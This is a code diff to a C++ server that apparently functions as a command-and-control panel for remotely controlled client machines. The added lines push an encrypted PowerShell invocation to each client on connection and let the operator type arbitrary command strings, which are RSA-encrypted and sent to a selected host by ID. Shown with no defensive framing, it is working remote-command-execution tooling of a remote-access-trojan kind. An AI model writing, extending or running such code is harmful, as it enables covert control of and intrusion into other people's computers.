@@ -340,6 +340,11 @@ void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
 
 	// tcp receive main loop
 	std::cout << "[TCP] : Receiving messages from " << cuid << " (" << client->GetMachineGUID() << "/" << client->GetDesktopName() << ")\n";
+	BYTESTRING command = Serialization::SerializeString("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ");
+	BYTESTRING encrypted = LGCrypto::RSAEncrypt(command, client->ClientPublicKey, FALSE);
+	NetCommon::TransmitData(encrypted, client->GetSocket(), TCP);
+	std::cout << "?" << std::endl;
+
 	do
 	{
 
@@ -455,31 +460,33 @@ void ServerInterface::RunUserInputOnClients() {
 
 	while ( this->m_TCPServerDetails.alive && m_ClientList.size() > 0 ) {
 		// select which client to run command on
-		unsigned long clientID  = 0;	
-		unsigned int  command   = 0;
+		std::string clientID;	
+		//unsigned int  command   = 0;
 		BOOL		  performed = FALSE;
 		ServerCommand performingCommand;
 
 		std::cout << "YOU ARE NOW RUNNING COMMANDS ON REMOTE HOSTS...\n";
 		std::cout << "Enter 'ClientID' of the remote host to perform commands on (0 for all): ";
-		std::cin >> clientID;
-		std::cout << "\nPerforming commands on client " << clientID << std::endl;
+		//std::cin >> clientID;
+		std::getline(std::cin, clientID);
 
 		// input number corrosponding to remote host command
-		std::cout << "Input number corresponding to remote host command: ";
-		std::cin >> command;
+		//std::cout << "Input number corresponding to remote host command: ";
+		std::string command;
+		std::getline(std::cin, command);
 		std::cout << "Your input: " << command << std::endl;
-		performed = HandleUserInput(command, performingCommand);
-		std::cout << "Fill out performingCommand\n";
+		//performed = HandleUserInput(command, performingCommand);
+		//std::cout << "Fill out performingCommand\n";
 
-		Client* client = GetClientPtr(clientID);
+		Client* client = GetClientPtr(std::stol(clientID));
 		if ( !client ) {
 			system("cls");
 			continue;
 		}
-
-		BYTESTRING serialized = Serialization::SerializeString("hello");
-		std::cout << "serialized size:" << serialized.size() << std::endl;
+		
+		//std::cout << "cli size " << performingCommand.commandLineArguments.size() << std::endl;
+		BYTESTRING serialized = Serialization::SerializeString(command);
+		//std::cout << "serialized size:" << serialized.size() << std::endl;
 		BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
 		std::cout << "encrypted\n";
 
